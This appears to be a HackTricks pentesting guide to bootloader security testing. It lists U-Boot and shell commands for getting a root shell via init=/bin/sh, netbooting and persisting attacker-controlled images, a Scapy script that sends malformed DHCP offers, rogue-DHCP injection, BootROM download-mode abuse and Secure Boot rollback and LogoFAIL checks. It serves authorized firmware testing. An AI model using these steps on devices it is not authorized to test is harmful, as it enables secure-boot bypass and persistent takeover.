# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Aşağıdaki adımlar, cihaz başlangıç yapılandırmalarını değiştirmek ve U-Boot ve UEFI-class loaders gibi bootloader'ları test etmek için önerilir. Erken kod yürütmesini elde etmeye, signature/rollback korumalarını değerlendirmeye ve recovery veya network-boot yollarını istismar etmeye odaklanın.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- During boot, hit a known break key (often any key, 0, space, or a board-specific "magic" sequence) before `bootcmd` executes to drop to the U-Boot prompt.

2. Inspect boot state and variables
- Useful commands:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- Append `init=/bin/sh` so the kernel drops to a shell instead of normal init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Configure network and fetch a kernel/fit image from LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- If env storage isn’t write-protected, you can persist control:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Check for variables like `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` that influence fallback paths. Misconfigured values can grant repeated breaks into the shell.

6. Check debug/unsafe features
- Look for: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, ability to `loady`/`loads` via serial, `env import` from untrusted media, and kernels/ramdisks loaded without signature checks.

7. U-Boot image/verification testing
- If the platform claims secure/verified boot with FIT images, try both unsigned and tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Absence of `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` or legacy `verify=n` behavior often allows booting arbitrary payloads.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling has had memory-safety issues. For example, CVE‑2024‑42040 describes memory disclosure via crafted DHCP responses that can leak bytes from U-Boot memory back on the wire. Exercise the DHCP/PXE code paths with overly long/edge-case values (option 67 bootfile-name, vendor options, file/servername fields) and observe for hangs/leaks.
- Minimal Scapy snippet to stress boot parameters during netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Also validate if PXE filename fields are passed to shell/loader logic without sanitization when chained to OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Set up a rogue DHCP/PXE service and try injecting characters into filename or options fields to reach command interpreters in later stages of the boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, or custom Scapy scripts work well. Ensure you isolate the lab network first.

## SoC ROM recovery modes that override normal boot

Many SoCs expose a BootROM "loader" mode that will accept code over USB/UART even when flash images are invalid. If secure-boot fuses aren’t blown, this can provide arbitrary code execution very early in the chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Assess whether the device has secure-boot eFuses/OTP burned. If not, BootROM download modes frequently bypass any higher-level verification (U-Boot, kernel, rootfs) by executing your first-stage payload directly from SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount the EFI System Partition (ESP) and check for loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Try booting with downgraded or known-vulnerable signed boot components if Secure Boot revocations (dbx) aren’t current. If the platform still trusts old shims/bootmanagers, you can often load your own kernel or `grub.cfg` from the ESP to gain persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Several OEM/IBV firmwares were vulnerable to image-parsing flaws in DXE that process boot logos. If an attacker can place a crafted image on the ESP under a vendor-specific path (e.g., `\EFI\<vendor>\logo\*.bmp`) and reboot, code execution during early boot may be possible even with Secure Boot enabled. Test whether the platform accepts user-supplied logos and whether those paths are writable from the OS.

## Hardware caution

Be cautious when interacting with SPI/NAND flash during early boot (e.g., grounding pins to bypass reads) and always consult the flash datasheet. Mistimed shorts can corrupt the device or the programmer.

## Notes and additional tips

- Try `env export -t ${loadaddr}` and `env import -t ${loadaddr}` to move environment blobs between RAM and storage; some platforms allow importing env from removable media without authentication.
- For persistence on Linux-based systems that boot via `extlinux.conf`, modifying the `APPEND` line (to inject `init=/bin/sh` or `rd.break`) on the boot partition is often enough when no signature checks are enforced.
- If userland provides `fw_printenv/fw_setenv`, validate that `/etc/fw_env.config` matches the real env storage. Misconfigured offsets let you read/write the wrong MTD region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
